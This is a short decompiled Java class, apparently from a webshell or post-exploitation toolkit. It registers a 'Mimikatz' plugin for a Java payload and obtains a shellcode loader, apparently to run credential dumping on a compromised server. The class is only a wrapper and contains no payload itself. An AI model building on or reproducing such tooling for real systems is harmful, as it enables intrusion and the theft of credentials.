//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.java;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "Mimikatz",
        DisplayName = "Mimikatz"
)
public class Mimikatz extends shells.plugins.generic.Mimikatz {
    public Mimikatz() {
    }

    protected ShellcodeLoader getShellcodeLoader() {
        return (ShellcodeLoader)super.shellEntity.getFrame().getPlugin("ShellcodeLoader");
    }
}
